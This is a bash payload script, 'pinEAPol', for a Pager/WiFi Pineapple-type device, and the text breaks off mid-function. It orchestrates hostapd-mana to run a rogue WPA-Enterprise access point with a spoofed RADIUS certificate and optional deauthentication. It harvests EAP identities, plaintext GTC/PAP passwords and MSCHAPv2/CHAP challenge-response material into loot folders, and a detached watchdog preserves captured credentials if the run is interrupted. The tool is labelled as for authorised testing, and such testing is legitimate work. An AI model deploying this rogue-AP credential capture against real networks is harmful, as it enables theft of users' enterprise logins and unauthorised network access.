#!/bin/bash
# Title: pinEAPol
# Author: R4g3D
# Description: Pager-native hostapd-mana orchestrator for authorized WPA-Enterprise EAP credential capture
# Version: 3.7
# Requires: openssl-util, iw, net-tools-ifconfig; tcpdump optional; monitor/AP-capable radio
# Category: user/capture
# Based on VENOM by sinXneo.
#
# pinEAPol discovers or accepts a WPA-Enterprise target, deploys a configurable
# hostapd-mana test AP, and preserves EAP negotiation evidence. Depending on the
# client-selected method, it records identities, GTC/PAP plaintext, CHAP data,
# and MSCHAPv2 challenge/response material suitable for authorized analysis.
# Unknown credentials may fail authentication and still produce useful evidence.
#
# AUTHORIZED SECURITY TESTING ONLY

MANA_BUNDLED_FILENAME="hostapd-mana-mipsel_24kc"

# The Pager UI may stage or source payload.sh from a temporary location. Resolve
# the installed payload folder by looking for its bundled binary instead of
# assuming BASH_SOURCE always points at the folder selected in the UI.
resolve_payload_dir() {
    local script_reference source_dir candidate

    script_reference="${BASH_SOURCE[0]:-$0}"
    source_dir=$(CDPATH= cd -- "$(dirname -- "$script_reference")" 2>/dev/null && pwd) || source_dir=""

    for candidate in \
        "${PINEAPOL_PAYLOAD_DIR:-}" \
        "$source_dir" \
        "${PWD:-}" \
        "/root/payloads/user/capture/pineapol" \
        "/mmc/root/payloads/user/capture/pineapol"; do
        [ -n "$candidate" ] || continue
        if [ -f "$candidate/bin/$MANA_BUNDLED_FILENAME" ]; then
            (CDPATH= cd -- "$candidate" 2>/dev/null && pwd)
            return
        fi
    done

    # Preserve the original source-relative location for a useful error message.
    printf '%s\n' "${source_dir:-${PWD:-.}}"
}

PAYLOAD_DIR=$(resolve_payload_dir)

# ============================================
# CONFIGURATION
# ============================================

# Persistent storage. Runtime files are written directly into their final
# session folder so an interruption cannot erase the diagnostic evidence.
PINEAPOL_HOME="/root/loot/pineapol"
LOOT_DIR="$PINEAPOL_HOME/sessions"
PERSISTENT_CONFIG_DIR="$PINEAPOL_HOME/config"
FAST_PAC_KEY_FILE="$PERSISTENT_CONFIG_DIR/fast-pac-opaque.key"
EAP_PROFILE_DIR="$PERSISTENT_CONFIG_DIR/eap-profiles"
HOSTAPD_CACHE_DIR="$PINEAPOL_HOME/bin"
CERT_STORE="$PINEAPOL_HOME/certificates"
CURRENT_LINK="$PINEAPOL_HOME/current"
RUNTIME_DIR="$PINEAPOL_HOME/run"
RUNTIME_LOCK_DIR="$RUNTIME_DIR/lock"
HOSTAPD_PID_FILE="$RUNTIME_DIR/hostapd.pid"
HOSTAPD_START_FILE="$RUNTIME_DIR/hostapd.start"
HOSTAPD_CONFIG_FILE="$RUNTIME_DIR/hostapd.config"
TCPDUMP_PID_FILE="$RUNTIME_DIR/tcpdump.pid"
TCPDUMP_START_FILE="$RUNTIME_DIR/tcpdump.start"
PAYLOAD_PID_FILE="$RUNTIME_LOCK_DIR/payload.pid"
PAYLOAD_START_FILE="$RUNTIME_LOCK_DIR/payload.start"
PINEAPOL_PROC_ROOT="${PINEAPOL_PROC_ROOT:-/proc}"

SESSION_CONFIG_DIR=""
SESSION_LOG_DIR=""
SESSION_CAPTURE_DIR=""
SESSION_RESULTS_DIR=""
SESSION_WORK_DIR=""
CERT_DIR=""
HOSTAPD_CONF=""
EAP_USER_FILE=""
HOSTAPD_LOG=""
MANA_CREDOUT=""
TCPDUMP_PCAP=""
TCPDUMP_LOG=""
HOSTAPD_CTRL_DIR=""

# Rogue AP settings
PINEAPOL_IFACE="wlan_pineapol"
PHY_DEVICE="phy1"
DEFAULT_CHANNEL=6
DEFAULT_HW_MODE="g"

# The payload ships a pinned mipsel_24kc hostapd-mana build. It is copied into
# persistent storage after checksum, feature, loader, and library validation;
# the system hostapd/wpad installation is never replaced.
HOSTAPD_BIN=""
HOSTAPD_BACKEND="mana-wpe"
MANA_BUNDLED_BIN="$PAYLOAD_DIR/bin/$MANA_BUNDLED_FILENAME"
MANA_BUNDLED_BUILDINFO="$PAYLOAD_DIR/bin/$MANA_BUNDLED_FILENAME.buildinfo"
MANA_EXPECTED_SHA256="0c1c6b332ba13e1c2b07b3375b5de4c5f8390ce9a6f092152795ef0477a8c2b7"
MANA_BUILD_ID="785ced85088725913df1202b85a99ac3724caa4b"
HOSTAPD_UPDATE_POLICY="ask"
HOSTAPD_UPDATE_INTERVAL_HOURS=24
HOSTAPD_KEEP_VERSIONS=2

# Certificate settings
CERT_CN="radius-server-auth.local"
CERT_CA_CN="Internal Root CA"
CERT_ORG="Global Security Authority"
CERT_OU=""
CERT_COUNTRY="US"
CERT_STATE="State"
CERT_LOCALITY="City"
CERT_DNS_SANS="radius-server-auth.local"
CERT_IP_SANS="127.0.0.1"
CERT_DAYS=3650
CERT_KEY_BITS=2048
CERT_RENEW_BEFORE_DAYS=30
CERT_PROFILE="default"
CERT_FORCE_REGENERATE=0

# EAP profile selected at runtime
EAP_PROFILE="broad"

# Input device for button detection
INPUT=/dev/input/event0

# Process tracking
HOSTAPD_PID=""
TCPDUMP_PID=""
WATCHDOG_PID=""
PAYLOAD_START_TIME=""
RUNTIME_LOCK_HELD=0
CLEANUP_ACTIVE=0

# Counters
IDENTITY_COUNT=0
CLEARTEXT_COUNT=0
MSCHAPV2_COUNT=0
CHAP_COUNT=0
WPA2_HASH_COUNT=0
TLS_EVIDENCE_COUNT=0

# Session tracking
SESSION_DIR=""
SESSION_LOG=""
START_TIME=""

# Target info
TARGET_SSID=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_SIGNAL=""
DEAUTH_ENABLED=0
DEAUTH_BURST_COUNT=30

# ============================================
# HELPERS
# ============================================

logboth() {
    local color="${1:-}"
    local msg="${2:-}"
    if [ -z "$msg" ]; then
        msg="$color"
        LOG "$msg"
    else
        LOG "$color" "$msg"
    fi
    [ -n "$SESSION_LOG" ] && echo "$(date '+%H:%M:%S') $msg" >> "$SESSION_LOG"
    return 0
}

safe_slug() {
    printf '%s' "$1" | tr -c 'A-Za-z0-9._-' '_' | cut -c 1-48
}

runtime_write_atomic() {
    local value="$1"
    local destination="$2"
    local candidate="$destination.new.$$"
    printf '%s\n' "$value" > "$candidate" || return 1
    chmod 600 "$candidate" 2>/dev/null
    mv "$candidate" "$destination"
}

process_start_time() {
    local pid="$1"
    local stat_file="$PINEAPOL_PROC_ROOT/$pid/stat"
    if [ -r "$stat_file" ]; then
        awk '{ print $22; exit }' "$stat_file" 2>/dev/null
    else
        # Repository tests run without Linux procfs. A live PID is still enough
        # to exercise lock behavior there; Pager process ownership uses procfs.
        printf '%s\n' unknown
    fi
}

process_is_same() {
    local pid="$1"
    local expected_start="$2"
    local process_state
    case "$pid" in ''|*[!0-9]*) return 1 ;; esac
    kill -0 "$pid" 2>/dev/null || return 1
    if [ -r "$PINEAPOL_PROC_ROOT/$pid/stat" ]; then
        process_state=$(awk '{ print $3; exit }' "$PINEAPOL_PROC_ROOT/$pid/stat" 2>/dev/null)
        [ "$process_state" = "Z" ] && return 1
    fi
    [ -z "$expected_start" ] && return 0
    [ "$expected_start" = unknown ] && return 0
    [ "$(process_start_time "$pid")" = "$expected_start" ]
}

acquire_runtime_lock() {
    local owner_pid owner_start
    mkdir -p "$RUNTIME_DIR" || return 1
    chmod 700 "$RUNTIME_DIR" 2>/dev/null

    if ! mkdir "$RUNTIME_LOCK_DIR" 2>/dev/null; then
        owner_pid=$(sed -n '1p' "$PAYLOAD_PID_FILE" 2>/dev/null)
        owner_start=$(sed -n '1p' "$PAYLOAD_START_FILE" 2>/dev/null)
        if process_is_same "$owner_pid" "$owner_start"; then
            logboth red "Another pinEAPol payload is already running (PID $owner_pid)"
            return 1
        fi
        rm -f "$PAYLOAD_PID_FILE" "$PAYLOAD_START_FILE"
        rmdir "$RUNTIME_LOCK_DIR" 2>/dev/null || return 1
        mkdir "$RUNTIME_LOCK_DIR" 2>/dev/null || return 1
    fi

    PAYLOAD_START_TIME=$(process_start_time $$)
    runtime_write_atomic "$$" "$PAYLOAD_PID_FILE" || return 1
    runtime_write_atomic "$PAYLOAD_START_TIME" "$PAYLOAD_START_FILE" || return 1
    RUNTIME_LOCK_HELD=1
    return 0
}

release_runtime_lock() {
    [ "$RUNTIME_LOCK_HELD" -eq 1 ] || return 0
    local owner_pid owner_start
    owner_pid=$(sed -n '1p' "$PAYLOAD_PID_FILE" 2>/dev/null)
    owner_start=$(sed -n '1p' "$PAYLOAD_START_FILE" 2>/dev/null)
    if [ "$owner_pid" = "$$" ] && [ "$owner_start" = "$PAYLOAD_START_TIME" ]; then
        rm -f "$PAYLOAD_PID_FILE" "$PAYLOAD_START_FILE"
        rmdir "$RUNTIME_LOCK_DIR" 2>/dev/null
    fi
    RUNTIME_LOCK_HELD=0
}

hostapd_config_is_managed() {
    local config_file="$1"
    [ -r "$config_file" ] || return 1
    grep -Fxq '# pinEAPol hostapd-mana configuration' \
        "$config_file" 2>/dev/null || return 1
    grep -Fxq "interface=$PINEAPOL_IFACE" "$config_file" 2>/dev/null
}

managed_hostapd_config_for_pid() {
    local pid="$1"
    local argument
    [ -r "$PINEAPOL_PROC_ROOT/$pid/cmdline" ] || return 1
    while IFS= read -r argument; do
        case "$argument" in
            */hostapd.conf)
                if hostapd_config_is_managed "$argument"; then
                    printf '%s\n' "$argument"
                    return 0
                fi
                # If an interrupted run's loot was moved after hostapd opened
                # the file, retain a narrowly scoped path-based recovery route.
                case "$argument" in
                    "$PINEAPOL_HOME"/sessions/*/config/hostapd.conf)
                        printf '%s\n' "$argument"
                        return 0
                        ;;
                esac
                ;;
        esac
    done < <(tr '\000' '\n' < "$PINEAPOL_PROC_ROOT/$pid/cmdline" 2>/dev/null)
    return 1
}

is_managed_hostapd_pid() {
    local pid="$1"
    local expected_start="${2:-}"
    local actual_sha
    process_is_same "$pid" "$expected_start" || return 1
    [ -r "$PINEAPOL_PROC_ROOT/$pid/exe" ] || return 1
    managed_hostapd_config_for_pid "$pid" >/dev/null || return 1
    actual_sha=$(calculate_sha256 "$PINEAPOL_PROC_ROOT/$pid/exe")
    [ "$actual_sha" = "$MANA_EXPECTED_SHA256" ] || return 1
}

record_hostapd_state() {
    local pid="$1"
    local config_file="$2"
    local start_time
    start_time=$(process_start_time "$pid")
    runtime_write_atomic "$pid" "$HOSTAPD_PID_FILE" || return 1
    runtime_write_atomic "$start_time" "$HOSTAPD_START_FILE" || return 1
    runtime_write_atomic "$config_file" "$HOSTAPD_CONFIG_FILE" || return 1
}

clear_hostapd_state() {
    rm -f "$HOSTAPD_PID_FILE" "$HOSTAPD_START_FILE" "$HOSTAPD_CONFIG_FILE"
}

stop_managed_hostapd_pid() {
    local pid="$1"
    local expected_start="${2:-}"
    local wait_count=0
    process_is_same "$pid" "$expected_start" || return 0
    if ! is_managed_hostapd_pid "$pid" "$expected_start"; then
        logboth yellow "Refusing to stop unverified hostapd PID $pid"
        return 1
    fi

    kill "$pid" 2>/dev/null
    while kill -0 "$pid" 2>/dev/null && [ "$wait_count" -lt 3 ]; do
        sleep 1
        wait_count=$((wait_count + 1))
    done
    if kill -0 "$pid" 2>/dev/null; then
        kill -9 "$pid" 2>/dev/null
    fi
    wait "$pid" 2>/dev/null || true
    return 0
}

stop_managed_hostapd() {
    local pid start_time
    pid="${HOSTAPD_PID:-$(sed -n '1p' "$HOSTAPD_PID_FILE" 2>/dev/null)}"
    start_time=$(sed -n '1p' "$HOSTAPD_START_FILE" 2>/dev/null)
    if [ -n "$pid" ]; then
        stop_managed_hostapd_pid "$pid" "$start_time" || return 1
    fi
    HOSTAPD_PID=""
    clear_hostapd_state
    return 0
}

record_capture_state() {
    local pid="$1"
    runtime_write_atomic "$pid" "$TCPDUMP_PID_FILE" || return 1
    runtime_write_atomic "$(process_start_time "$pid")" "$TCPDUMP_START_FILE" || return 1
}

clear_capture_state() {
    rm -f "$TCPDUMP_PID_FILE" "$TCPDUMP_START_FILE"
}

capture_pid_is_managed() {
    local pid="$1"
    local expected_start="$2"
    local command_line
    process_is_same "$pid" "$expected_start" || return 1
    [ -r "$PINEAPOL_PROC_ROOT/$pid/cmdline" ] || return 1
    command_line=$(tr '\000' ' ' < "$PINEAPOL_PROC_ROOT/$pid/cmdline" 2>/dev/null)
    case "$command_line" in
        *tcpdump*"$PINEAPOL_HOME"/*) return 0 ;;
    esac
    return 1
}

remove_managed_interfaces() {
    command -v iw >/dev/null 2>&1 || return 0
    if iw dev "$PINEAPOL_IFACE" info >/dev/null 2>&1; then
        command -v ifconfig >/dev/null 2>&1 && ifconfig "$PINEAPOL_IFACE" down 2>/dev/null
        iw dev "$PINEAPOL_IFACE" del 2>/dev/null
    fi
}

recover_stale_runtime() {
    local pid start_time proc_dir recovered=0

    pid=$(sed -n '1p' "$HOSTAPD_PID_FILE" 2>/dev/null)
    start_time=$(sed -n '1p' "$HOSTAPD_START_FILE" 2>/dev/null)
    if [ -n "$pid" ] && process_is_same "$pid" "$start_time"; then
        logboth yellow "Recovering recorded hostapd-mana PID $pid"
        stop_managed_hostapd_pid "$pid" "$start_time" && recovered=1
    fi
    clear_hostapd_state

    # Recover even when the previous shell died before writing or clearing its
    # PID file. The executable checksum and managed config marker must both match.
    if [ -d "$PINEAPOL_PROC_ROOT" ]; then
        for proc_dir in "$PINEAPOL_PROC_ROOT"/[0-9]*; do
            [ -d "$proc_dir" ] || continue
            pid=${proc_dir##*/}
            if is_managed_hostapd_pid "$pid" ""; then
                logboth yellow "Recovering orphaned hostapd-mana PID $pid"
                stop_managed_hostapd_pid "$pid" "" && recovered=1
            fi
        done
    fi

    pid=$(sed -n '1p' "$TCPDUMP_PID_FILE" 2>/dev/null)
    start_time=$(sed -n '1p' "$TCPDUMP_START_FILE" 2>/dev/null)
    if [ -n "$pid" ] && capture_pid_is_managed "$pid" "$start_time"; then
        kill -INT "$pid" 2>/dev/null
        sleep 1
        kill "$pid" 2>/dev/null
        recovered=1
    fi
    clear_capture_state
    remove_managed_interfaces

    [ "$recovered" -eq 1 ] && logboth green "Recovered stale pinEAPol runtime"
    return 0
}

record_radio_diagnostics() {
    local diagnostic_file="$SESSION_LOG_DIR/radio-state.log"
    {
        echo "captured_at=$(date '+%Y-%m-%dT%H:%M:%S%z')"
        echo "--- iw dev ---"
        iw dev 2>&1
        echo "--- hostapd processes ---"
        ps w 2>&1 | grep '[h]ostapd' || true
        echo "--- runtime ownership ---"
        for state_file in "$HOSTAPD_PID_FILE" "$HOSTAPD_START_FILE" \
            "$HOSTAPD_CONFIG_FILE" "$PAYLOAD_PID_FILE" "$PAYLOAD_START_FILE"; do
            if [ -f "$state_file" ]; then
                printf '%s=' "$(basename "$state_file")"
                sed -n '1p' "$state_file"
            fi
        done
    } > "$diagnostic_file"
    chmod 600 "$diagnostic_file" 2>/dev/null
}

# Prefer the native Pager list control. Firmware predating LIST_PICKER gets a
# blocking, readable menu followed by a numeric picker instead of racing a
# NUMBER_PICKER against transient LOG output.
ui_list_picker() {
    local title="$1"
    local default_value="$2"
    shift 2
    local options=("$@")

    if type LIST_PICKER >/dev/null 2>&1; then
        LIST_PICKER "$title" "${options[@]}" "$default_value"
        return $?
    fi

    local menu="$title"
    local index=1 default_index=1 option selected
    for option in "${options[@]}"; do
        menu="$menu
$index. $option"
        [ "$option" = "$default_value" ] && default_index=$index
        index=$((index + 1))
    done
    menu="$menu

Press OK, then enter a number."
    PROMPT "$menu" >/dev/null 2>&1 || return 1
    selected=$(NUMBER_PICKER "Select option (1-${#options[@]})" "$default_index") || return 1
    case "$selected" in ''|*[!0-9]*) return 1 ;; esac
    [ "$selected" -ge 1 ] 2>/dev/null && [ "$selected" -le "${#options[@]}" ] 2>/dev/null || return 1
    printf '%s' "${options[$((selected - 1))]}"
}

initialize_persistent_storage() {
    umask 077

    # Recompute derived paths so repository tests and advanced callers can
    # safely override PINEAPOL_HOME before initialization.
    RUNTIME_DIR="$PINEAPOL_HOME/run"
    RUNTIME_LOCK_DIR="$RUNTIME_DIR/lock"
    HOSTAPD_PID_FILE="$RUNTIME_DIR/hostapd.pid"
    HOSTAPD_START_FILE="$RUNTIME_DIR/hostapd.start"
    HOSTAPD_CONFIG_FILE="$RUNTIME_DIR/hostapd.config"
    TCPDUMP_PID_FILE="$RUNTIME_DIR/tcpdump.pid"
    TCPDUMP_START_FILE="$RUNTIME_DIR/tcpdump.start"
    PAYLOAD_PID_FILE="$RUNTIME_LOCK_DIR/payload.pid"
    PAYLOAD_START_FILE="$RUNTIME_LOCK_DIR/payload.start"
    FAST_PAC_KEY_FILE="$PERSISTENT_CONFIG_DIR/fast-pac-opaque.key"

    mkdir -p "$LOOT_DIR" "$PERSISTENT_CONFIG_DIR" "$EAP_PROFILE_DIR" \
        "$HOSTAPD_CACHE_DIR" "$CERT_STORE" "$RUNTIME_DIR" || return 1
    chmod 700 "$PINEAPOL_HOME" "$LOOT_DIR" "$PERSISTENT_CONFIG_DIR" \
        "$HOSTAPD_CACHE_DIR" "$CERT_STORE" "$RUNTIME_DIR" 2>/dev/null

    acquire_runtime_lock || return 1
    cleanup_all_stale_parse_staging

    local target_slug
    target_slug=$(safe_slug "${TARGET_SSID:-unselected}")
    [ -z "$target_slug" ] && target_slug="unselected"

    SESSION_DIR="$LOOT_DIR/$(date +%Y%m%d_%H%M%S)_$target_slug"
    SESSION_CONFIG_DIR="$SESSION_DIR/config"
    SESSION_LOG_DIR="$SESSION_DIR/logs"
    SESSION_CAPTURE_DIR="$SESSION_DIR/captures"
    SESSION_RESULTS_DIR="$SESSION_DIR/results"
    SESSION_WORK_DIR="$SESSION_DIR/work"
    HOSTAPD_CTRL_DIR="$SESSION_WORK_DIR/hostapd-control"
    mkdir -p "$SESSION_CONFIG_DIR" "$SESSION_LOG_DIR" "$SESSION_CAPTURE_DIR" \
        "$SESSION_RESULTS_DIR" "$SESSION_WORK_DIR" "$HOSTAPD_CTRL_DIR" || return 1
    chmod 700 "$HOSTAPD_CTRL_DIR" 2>/dev/null

    HOSTAPD_CONF="$SESSION_CONFIG_DIR/hostapd.conf"
    EAP_USER_FILE="$SESSION_CONFIG_DIR/eap_users"
    HOSTAPD_LOG="$SESSION_LOG_DIR/hostapd.log"
    MANA_CREDOUT="$SESSION_LOG_DIR/mana-credentials.log"
    TCPDUMP_PCAP="$SESSION_CAPTURE_DIR/eap_capture.pcap"
    TCPDUMP_LOG="$SESSION_LOG_DIR/tcpdump.log"
    SESSION_LOG="$SESSION_LOG_DIR/session.log"
    START_TIME=$(date +%s)

    ln -sfn "$SESSION_DIR" "$CURRENT_LINK" 2>/dev/null
    echo "$(date '+%Y-%m-%d %H:%M:%S') pinEAPol session created" > "$SESSION_LOG"
    return 0
}

ensure_fast_pac_key() {
    local pac_key=""
    local error_log="${SESSION_LOG:-/dev/null}"

    if [ -f "$FAST_PAC_KEY_FILE" ]; then
        IFS= read -r pac_key < "$FAST_PAC_KEY_FILE" || true
        case "$pac_key" in
            *[!0-9A-Fa-f]*|'') pac_key="" ;;
        esac
        [ "$(printf '%s' "$pac_key" | wc -c | tr -d ' ')" = 32 ] || pac_key=""
    fi

    if [ -z "$pac_key" ]; then
        if ! command -v dd >/dev/null 2>&1 || ! command -v openssl >/dev/null 2>&1; then
            logboth red "Cannot generate EAP-FAST PAC key: dd or openssl is unavailable"
            return 1
        fi
        # Do not use BusyBox hexdump here: some Pager builds format a short
        # result despite dd reading a full block. openssl dgst is already used
        # by this payload and yields stable hexadecimal text.
        pac_key=$(dd if=/dev/urandom bs=32 count=1 2>/dev/null | \
            openssl dgst -sha256 2>> "$error_log" | awk '{print $NF}' | cut -c 1-32)
        case "$pac_key" in
            *[!0-9A-Fa-f]*|'') logboth red "Could not generate EAP-FAST PAC key"; return 1 ;;
        esac
        [ "$(printf '%s' "$pac_key" | wc -c | tr -d ' ')" = 32 ] || {
            logboth red "Could not generate EAP-FAST PAC key"
            return 1
        }
        printf '%s\n' "$pac_key" > "$FAST_PAC_KEY_FILE" || return 1
        chmod 600 "$FAST_PAC_KEY_FILE" 2>/dev/null
    fi
}

rename_session_for_target() {
    local target_slug new_session
    target_slug=$(safe_slug "${TARGET_SSID:-unselected}")
    [ -z "$target_slug" ] && target_slug="unselected"
    new_session="${SESSION_DIR%_unselected}_$target_slug"
    [ "$new_session" = "$SESSION_DIR" ] && return 0

    if mv "$SESSION_DIR" "$new_session" 2>/dev/null; then
        SESSION_DIR="$new_session"
        SESSION_CONFIG_DIR="$SESSION_DIR/config"
        SESSION_LOG_DIR="$SESSION_DIR/logs"
        SESSION_CAPTURE_DIR="$SESSION_DIR/captures"
        SESSION_RESULTS_DIR="$SESSION_DIR/results"
        SESSION_WORK_DIR="$SESSION_DIR/work"
        HOSTAPD_CONF="$SESSION_CONFIG_DIR/hostapd.conf"
        EAP_USER_FILE="$SESSION_CONFIG_DIR/eap_users"
        HOSTAPD_LOG="$SESSION_LOG_DIR/hostapd.log"
        MANA_CREDOUT="$SESSION_LOG_DIR/mana-credentials.log"
        TCPDUMP_PCAP="$SESSION_CAPTURE_DIR/eap_capture.pcap"
        TCPDUMP_LOG="$SESSION_LOG_DIR/tcpdump.log"
        SESSION_LOG="$SESSION_LOG_DIR/session.log"
        ln -sfn "$SESSION_DIR" "$CURRENT_LINK" 2>/dev/null
    fi
}

stop_capture() {
    local capture_start
    if [ -z "$TCPDUMP_PID" ]; then
        TCPDUMP_PID=$(sed -n '1p' "$TCPDUMP_PID_FILE" 2>/dev/null)
    fi
    if [ -z "$TCPDUMP_PID" ]; then
        clear_capture_state
        return 0
    fi
    capture_start=$(sed -n '1p' "$TCPDUMP_START_FILE" 2>/dev/null)

    if capture_pid_is_managed "$TCPDUMP_PID" "$capture_start"; then
        # SIGINT asks libpcap to finish the file header and flush packet data.
        kill -INT "$TCPDUMP_PID" 2>/dev/null
        local capture_wait=0
        while kill -0 "$TCPDUMP_PID" 2>/dev/null && [ "$capture_wait" -lt 3 ]; do
            sleep 1
            capture_wait=$((capture_wait + 1))
        done
        if kill -0 "$TCPDUMP_PID" 2>/dev/null; then
            kill "$TCPDUMP_PID" 2>/dev/null
        fi
    fi
    wait "$TCPDUMP_PID" 2>/dev/null || true
    TCPDUMP_PID=""
    clear_capture_state
}

stop_runtime_watchdog() {
    [ -n "$WATCHDOG_PID" ] || return 0
    if kill -0 "$WATCHDOG_PID" 2>/dev/null; then
        # The detached supervisor ignores the UI's normal termination signals.
        # USR1 is its private orderly-stop signal.
        kill -USR1 "$WATCHDOG_PID" 2>/dev/null
        local watchdog_wait=0
        while kill -0 "$WATCHDOG_PID" 2>/dev/null && [ "$watchdog_wait" -lt 2 ]; do
            sleep 1
            watchdog_wait=$((watchdog_wait + 1))
        done
        if kill -0 "$WATCHDOG_PID" 2>/dev/null; then
            kill -9 "$WATCHDOG_PID" 2>/dev/null
        fi
        wait "$WATCHDOG_PID" 2>/dev/null || true
    fi
    WATCHDOG_PID=""
}

cleanup_watchdog_main() {
    local parent_pid="$1"
    local parent_start="$2"
    local runtime_home="$3"
    local proc_root="$4"
    local managed_iface="$5"
    local expected_sha="$6"
    local orphan_pid orphan_start config_file session_dir wait_count

    [ -n "$runtime_home" ] && [ -n "$proc_root" ] || return 2
    [ "$managed_iface" = "wlan_pineapol" ] || return 2
    case "$expected_sha" in
        [0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*) ;;
        *) return 2 ;;
    esac

    # Rebuild runtime paths from explicit arguments. This lets the supervisor
    # run in a new session without inheriting shell-local state from the UI.
    PINEAPOL_HOME="$runtime_home"
    PINEAPOL_PROC_ROOT="$proc_root"
    PINEAPOL_IFACE="$managed_iface"
    MANA_EXPECTED_SHA256="$expected_sha"
    RUNTIME_DIR="$PINEAPOL_HOME/run"
    RUNTIME_LOCK_DIR="$RUNTIME_DIR/lock"
    HOSTAPD_PID_FILE="$RUNTIME_DIR/hostapd.pid"
    HOSTAPD_START_FILE="$RUNTIME_DIR/hostapd.start"
    HOSTAPD_CONFIG_FILE="$RUNTIME_DIR/hostapd.config"
    TCPDUMP_PID_FILE="$RUNTIME_DIR/tcpdump.pid"
    TCPDUMP_START_FILE="$RUNTIME_DIR/tcpdump.start"
    PAYLOAD_PID_FILE="$RUNTIME_LOCK_DIR/payload.pid"
    PAYLOAD_START_FILE="$RUNTIME_LOCK_DIR/payload.start"

    # Pager UI shutdown may signal the complete payload process group. Ignore
    # those signals in the detached supervisor; USR1 is reserved for a normal
    # cleanup that has already completed.
    trap - EXIT
    trap 'exit 0' USR1
    trap '' HUP INT TERM QUIT

    while process_is_same "$parent_pid" "$parent_start"; do
        sleep 1
    done

    config_file=$(sed -n '1p' "$HOSTAPD_CONFIG_FILE" 2>/dev/null || true)
    orphan_pid=$(sed -n '1p' "$HOSTAPD_PID_FILE" 2>/dev/null || true)
    orphan_start=$(sed -n '1p' "$HOSTAPD_START_FILE" 2>/dev/null || true)
    if [ -n "$orphan_pid" ] && is_managed_hostapd_pid "$orphan_pid" "$orphan_start"; then
        kill "$orphan_pid" 2>/dev/null
        wait_count=0
        while kill -0 "$orphan_pid" 2>/dev/null && [ "$wait_count" -lt 2 ]; do
            sleep 1
            wait_count=$((wait_count + 1))
        done
        kill -9 "$orphan_pid" 2>/dev/null || true
    fi

    orphan_pid=$(sed -n '1p' "$TCPDUMP_PID_FILE" 2>/dev/null || true)
    orphan_start=$(sed -n '1p' "$TCPDUMP_START_FILE" 2>/dev/null || true)
    if [ -n "$orphan_pid" ] && capture_pid_is_managed "$orphan_pid" "$orphan_start"; then
        kill -INT "$orphan_pid" 2>/dev/null
        sleep 1
        kill "$orphan_pid" 2>/dev/null || true
    fi

    # Retry because nl80211 may briefly retain the AP interface while hostapd
    # completes its signal-driven driver teardown.
    wait_count=0
    while iw dev "$PINEAPOL_IFACE" info >/dev/null 2>&1 && [ "$wait_count" -lt 3 ]; do
        command -v ifconfig >/dev/null 2>&1 && ifconfig "$PINEAPOL_IFACE" down 2>/dev/null
        iw dev "$PINEAPOL_IFACE" del 2>/dev/null
        wait_count=$((wait_count + 1))
        [ "$wait_count" -lt 3 ] && sleep 1
    done

    clear_hostapd_state
    clear_capture_state
    if [ "$(sed -n '1p' "$PAYLOAD_PID_FILE" 2>/dev/null)" = "$parent_pid" ] && \
       [ "$(sed -n '1p' "$PAYLOAD_START_FILE" 2>/dev/null)" = "$parent_start" ]; then
        rm -f "$PAYLOAD_PID_FILE" "$PAYLOAD_START_FILE"
        rmdir "$RUNTIME_LOCK_DIR" 2>/dev/null
    fi

    case "$config_file" in
        "$PINEAPOL_HOME"/sessions/*/config/hostapd.conf)
            session_dir=${config_file%/config/hostapd.conf}
            # A UI/process-group termination bypasses the normal harvest path.
            # Publish the evidence that hostapd-mana has already written before
            # clearing runtime state, so an interrupted run remains useful.
            SESSION_DIR="$session_dir"
            SESSION_LOG_DIR="$session_dir/logs"
            SESSION_RESULTS_DIR="$session_dir/results"
            SESSION_WORK_DIR="$session_dir/work"
            HOSTAPD_LOG="$SESSION_LOG_DIR/hostapd.log"
            MANA_CREDOUT="$SESSION_LOG_DIR/mana-credentials.log"
            mkdir -p "$SESSION_RESULTS_DIR" "$SESSION_WORK_DIR" 2>/dev/null
            if parse_credentials "$HOSTAPD_LOG" "$SESSION_RESULTS_DIR"; then
                printf '%s Detached watchdog evidence publication complete\n' \
                    "$(date '+%Y-%m-%d %H:%M:%S')" >> "$session_dir/logs/session.log" 2>/dev/null
            else
                printf '%s Detached watchdog evidence publication failed; raw logs preserved\n' \
                    "$(date '+%Y-%m-%d %H:%M:%S')" >> "$session_dir/logs/session.log" 2>/dev/null
            fi
            cleanup_stale_parse_staging "$SESSION_WORK_DIR"
            printf '%s Detached watchdog cleanup complete\n' \
                "$(date '+%Y-%m-%d %H:%M:%S')" >> "$session_dir/logs/session.log" 2>/dev/null
            ;;
    esac
    return 0
}

start_runtime_watchdog() {
    [ -n "$WATCHDOG_PID" ] && kill -0 "$WATCHDOG_PID" 2>/dev/null && return 0
    local parent_pid=$$
    local parent_start="$PAYLOAD_START_TIME"
    local bash_bin="${BASH:-/bin/bash}"

    if command -v setsid >/dev/null 2>&1 && [ -x "$bash_bin" ]; then
        setsid "$bash_bin" "$PAYLOAD_DIR/payload.sh" --cleanup-watchdog \
            "$parent_pid" "$parent_start" "$PINEAPOL_HOME" "$PINEAPOL_PROC_ROOT" \
            "$PINEAPOL_IFACE" "$MANA_EXPECTED_SHA256" \
            </dev/null >/dev/null 2>&1 &
    else
        # Fallback for firmware without setsid. Signal immunity still protects
        # against normal UI termination, though not a process-group SIGKILL.
        (
            cleanup_watchdog_main "$parent_pid" "$parent_start" "$PINEAPOL_HOME" \
                "$PINEAPOL_PROC_ROOT" "$PINEAPOL_IFACE" "$MANA_EXPECTED_SHA256"
        ) </dev/null >/dev/null 2>&1 &
    fi
    WATCHDOG_PID=$!
    return 0
}

cleanup() {
    [ "$CLEANUP_ACTIVE" -eq 0 ] || return 0
    CLEANUP_ACTIVE=1
    LOG yellow "Cleaning up..."

    # A second UI launch that failed to acquire the lock must never tear down
    # the active owner's processes or interfaces.
    if [ "$RUNTIME_LOCK_HELD" -eq 1 ]; then
        stop_managed_hostapd
        stop_capture
        remove_scan_interface
        remove_managed_interfaces
        # Keep the supervisor alive until resource cleanup is complete. If the
        # UI kills this shell mid-cleanup, it takes over and finishes the work.
        stop_runtime_watchdog
    fi

    # All runtime files are already in persistent session storage. Record the
    # stop time but do not remove logs, configs, captures, or work artifacts.
    if [ -n "$SESSION_LOG" ]; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') Cleanup complete" >> "$SESSION_LOG"
    fi
    if [ -n "$SESSION_DIR" ] && [ -n "$START_TIME" ] && [ ! -f "$SESSION_DIR/duration.txt" ]; then
        local cleanup_end cleanup_duration
        cleanup_end=$(date +%s)
